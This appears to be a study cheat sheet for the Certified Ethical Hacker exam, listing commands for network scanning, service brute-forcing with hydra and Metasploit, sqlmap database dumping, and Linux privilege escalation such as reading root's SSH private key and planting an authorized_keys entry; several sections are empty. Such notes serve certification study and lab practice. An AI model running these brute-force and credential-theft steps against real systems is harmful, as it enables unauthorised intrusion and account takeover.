@@ -1,0 +1,314 @@
+# CEH MASTER
+
+
+## 1. Scanning Networks
+
+| Target                                                         | Command |
+| Own IP                                                         | ip a |
+| Scanning network Live Host (ping sweep)                        | nmap -sP <host>/CIDR |
+| Scanning Live Host without port scan in same subnet (ARP Scan) | nmap -PR -sn <host>/CIDR |
+| Scripts + Version running on taget machine                     | nmap -sC -sV <host>/CIDR |
+| OS of the target machine                                       | nmap -O <host> |
+| All open ports of the target                                   | nmap -p- <host>/CIDR |
+| Specific port scan of the target                               | nmap -p (port number) <host>/CIDR |
+| Aggresive scan                                                 | nmap -A <host>/CIDR |
+| Scanning using NSE scripts                                     | nmap --scripts (script name) -p (port number) <host>/CIDR |  https://nmap.org/book/man-nse.html
+| Scripts + Version + Ports + OS Scan (overall)                  | nmap -sC -sV -p- -A -v -T4 <host>/CIDR |
+
+
+## 2. Service Enumeration
+
+| Target FTP (file transfer protocol) port 21   | Command | https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp
+| Connect to FTP                                | ftp <host> |
+| Brute force FTP                               | hydra -L /usr/share/wordlist/users.txt -P /usr/share/wordlist/passwords.txt <host> ftp 
+                                                | hydra -l administrator -P /usr/share/wordlist/passwords.txt <host> ftp 
+                                                | ncrack -U usernames.txt -P passwords.txt ftp://10.10.0.50 
+                                                | ncrack -U usernames.txt -P passwords.txt 10.10.0.50:21 -v 
+                                                | medusa -h 10.10.0.50 -U usernames.txt -P passwords.txt -M ftp 
+                                                | msf> auxiliary(scanner/ftp/ftp_login)>
+                                                | set RHOSTS <target IP>
+                                                | set user_file /path/usernames.txt
+                                                | set pass_file /path/passwords.txt
+| Download file from FTP after login            | ls then get secret.txt |
+
+| Target SSH port 22                             | Command | https://steflan-security.com/linux-privilege-escalation-exploiting-misconfigured-ssh-keys/
+| Banner grabbing                                | nc -vn <IP> 22 
+| Connection to port 22                          | telnet ip_address port | telnet -l root ip_address port |
+| Brute force username                           | hydra -l root -P passwords.txt [-t 32] <IP> ssh
+                                                 | msf> use scanner/ssh/ssh_enumusers |
+| Private key brute force                        | msf> use scanner/ssh/ssh_identify_pubkeys |
+
+
+| Target Telnet port 23                         | Command | https://book.hacktricks.xyz/network-services-pentesting/pentesting-telnet | https://www.hackingarticles.in/penetration-testing-telnet-port-23/
+| Enumerate Telnet                              | nmap -n -sV -Pn --script "*telnet* and safe" -p 23 <IP> |
+| Brute force Telnet credentials                | hydra -l root -P passwords.txt [-t 32] <IP> telnet |
+
+| Target SMTP port 25                           | Command | https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp
+| Initiate a TCP connection to port 25          | telnet ip_address port
+| Finding MX servers of an organisation         | dig +short mx google.com |
+| Enumeration                                   | nmap -p25 --script smtp-commands <host>
+                                                | nmap -p25 --script smtp-open-relay <host> -v |
+
+| Target DNS port 53                            | Command | https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns
+| Enumarate DNS                                 | dnsrecon -w -d <host> |
+| Brute forcing                                 | nmap --script dns-brute <host> |
+
+| Target NetBIOS port 137/138/139               | Command | https://book.hacktricks.xyz/network-services-pentesting/137-138-139-pentesting-netbios
+| Enumerate NetBIOS                             | nmap -sV -v <host>
+                                                | sudo nmap -sU --script nbstat.nse -p137 <host> |
+
+
+| Target SNMP (monitor and manage network devices) port 161 | Command | https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp
+| Enumarate SNMP                                            | nmap -sU <host>
+| Identify the processes running on the target machine      | snmp-check <host>
+                                                              Search goolge for nsedocs -> NSEDoc Reference Portal -> Scripts -> snmp
+                                                              nmap -sU -p 161 --script=snmp-processes <host> |
+| List valid comunity strings of the server                 | msfconsole
+                                                              search snmp
+                                                              use auxiliary/scanner/snmp/snmp_login
+                                                              show options
+                                                              set RHOST <host>
+                                                              exploit |
+| List all the interfaces of the machine                   | snmp-check <host>
+                                                            nmap -sU -p 161 --script=snmp-interfaces <host> |
+
+
+| Target SMB (server message block) port 445   | Command | https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
+| Enumarate Network File Shares                | Search goolge for nsedocs -> NSEDoc Reference Portal -> Scripts -> smb
+                                                 nmap --script smb-enum-shares.nse -p445 <host>
+                                                 sudo nmap -sU -sS --script smb-enum-shares.nse -p U:137,T:139 <host>
+                                                 smbclient -L \\<host> |
+| Logged in Users details                       | nmap --script smb-enum-users.nse -p445 IP
+                                                  sudo nmap -sU -sS --script smb-enum-users.nse -p U:137,T:139 <host> |
+| Workgroups                                   | nmap --script smb-enum-users.nse -p445 <host>
+                                                 sudo nmap -sU -sS --script smb-enum-users.nse -p U:137,T:139 <host> |
+| Secutiry level information                   | nmap -sC -sV -A -T4 -p 445 <host> |
+| Domains & Services                           | nmap --script smb-enum-services.nse -p445 <host>
+                                                 nmap --script smb-enum-services.nse --script-args smbusername=<username>,smbpass=<password> -p445 <host> |
+| Brute force SMB                              | hydra -L /usr/share/wordlist/users.txt -P /usr/share/wordlist/passwords.txt (optional -vV) <host> smb
+                                                 nmap --script smb-brute -p 445 <host> |
+| Connect to SMB                               | smbclient //<host>/<share_name) -W <domain_name> -U <Username%password> |
+| Mount SMB share to kali                      | sudo mount -t cifs //<host>/<share_name> /<local path> -o username=<username>,password=<password> |
+|                                              | nmap -p 445 --script-enum-users --script-args smbusername=adminitrator, smbpassword=smbserver_771 <host> |
+
+| Target RDP (remote desktop protocol) port 3389               | Command | https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp
+| Check running services on the target machine and confirm RDP | nmap <host> |
+| Use metasploit to confirm the services running is RDP        | msfconsole -q
+                                                                search rdp
+                                                                use auxiliary/scanner/rdp/rdp_scanner
+                                                                show options
+                                                                set RHOST <host>
+                                                                set RPORT 3333 (if there is no port 3389 on the target)
+                                                                exploit |
+| Use hydra to brute force the login credentials               | hydra -L /usr/share/wordlist/users.txt -P /usr/share/wordlist/passwords.txt rdp://<host> -s 3333 |
+| Use RDP tools to connect to machine                          | xfreerdp /u:<username> /p:<password> /v:<host>:3333 |
+
+https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force#telnet
+
+## 3. Traffic Sniffing
+
+| WireShark - Pcap File Analysis | Command |
+| Filtering packets | 1 |
+| Follow up Streams | 2 |
+| Finding Files | 3 |
+| Finding Comments | 4 |
+| Search Strings | 5 |
+| DoS attacks | filer packets with tcp.flags.syn==1 |
+| DDoS attacks |  |
+
+
+1
+
+
+2
+
+
+
+3
+
+
+4
+file property
+
+5
+Ctrl+F
+
+
+7
+
+click on IPv4 and filter by bytes
+
+
+
+## 4. Steganography
+Tools
+
+SNOW - for hiding and extracting hidden data from a text file
+Openstego - for hiding and extracting hidden data from an image file
+CovertTCP - for hiding data in TCP/IP packet headers
+
+SNOW:
+run cmd from SNOW folder
+C:\Users\Snow Tool>SNOW.EXE -C -m “<hidden text>” -p “<password>” <txt file> <output txt file>
+-C - compile
+-m - text we want to hide
+-p - password
+
+Extracting data:
+SNOW.EXE -C -p <password> <provided txt file>
+
+Openstego:
+2 optiojns to Hide or Extract data
+
+
+
+CovertTCP
+
+cc -o covert_tcp covert_tcp.c (On both client and server)
+
+On the server:
+./covert_tcp -source <client IP> -source_port 8888 -server -file <txt_file_to_write>
+
+On the client:
+./covert_tcp -source <client IP> -dest <server IP> -source_port 9999 -dest_port 8888 -file <txt_file_to_transfer>
+
+
+
+## 5. Cryptography
+Tools
+
+Hashmyfiles - for calculating and comparing hashes of files
+Cryptool - for encryption/decription of the hex data - by manipulating the key length
+BcTextEncoder - For encoding and decoding text in a file (.hex)
+CryptoForge - for encrypting/decrypting the files
+VeraCrypt - for hiding and encrypting the disk partiotions
+
+Hashmyfiles
+drag and drop files to check if they are tampered
+
+CryptoForge
+when installed you will get the option when right clicking on a file to encrypt/decrypt
+
+BcTextEncoder
+
+
+Cryptool
+
+
+
+
+VeraCrypt
+
+
+
+## 6. Hacking Web & Android
+exit
+Tools
+
+SQLMap - for finding SQL Injection Vulnerabilities
+Wpscan - scanning and finding issues in wordpress websites
+ADB - for connecting Android devices to PC and binary analysis
+Burpsuite - for analysing and manipulating the traffic
+
+SQLMap
+
+--dbs to enumarate Databases
+sqlmap --url <url> --dbs
+
+or capture in burpsuite and save the file in .txt, then:
+sqlmap -r <txt_file> --dbs
+
+-D info on database and info on payload
+sqlmap -r <txt_file> -D <database>
+
+--tables enumerate tables in database
+sqlmap -r <txt_file> -D <database> --tables
+
+--columns enumerate columns in database
+sqlmap -r <txt_file> -D <database> --tables --columns
+
+--dump
+sqlmap -r <txt_file> -D <database> --dump
+
+Wpscan
+
+wpscan -h
+
+--enumerate u (users)
+wpscan --url <url> --enumerate u
+
+ADB
+
+in windows powershell:
+adb devices
+adb connect <IP_of_device:port>
+adb shell
+cd sdcard/
+cat secret.txt
+
+## 7. Privilege Escalation Basics
+ssh <user_name>@<IP> -p <port>
+
+to check privileges
+sudo -l
+
+if there is a user with no pass:
+sudo -u <user> /bib/bash
+cd \
+cd /root
+cd .ssh
+cat id_rsa
+copy the key
+
+nano id_rsa
+paste the key
+ctrlS ctrlX
+chmod 600 id_rsa
+
+ssh root@<IP> -p <port> -i id_rsa
+*******************************
+ssh-keygen -t rsa
+cat ~/.ssh/id_rsa.pub | ssh USER@HOST "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"
+
+ssh <user_name>@<IP> -p <port> -i id_rsa
+*******************************
+- 1st_file we have permission
+- 2nd file we do not have permission
+
+stat -c “%a %A %U %G %F” <file>
+
+strings <file>
+if the second file is there:
+rm <2nd_file>
+cp /bin/bash <2nd_file>
+/<1sr_file>
+*******************************
+cd /var/www/html
+grep -nr “db_user”
+cat <link>
+
+su or sudo su if we find the pass
+*******************************
+LinEnum
+
+copy url
+git clone <url>
+cd LinEnum
+
+LinPEAS
+copy latest version
+wget <paste>
+chmod +x linpeas.sh
+
+./LinEnum.sh
+./linepeas.sh
+
+
+## 8. Malware Threats (RAT)
+5 RAT tools
+
+njRAT
+MoSucker
+ProRat
+Theef
+HTTP RAT
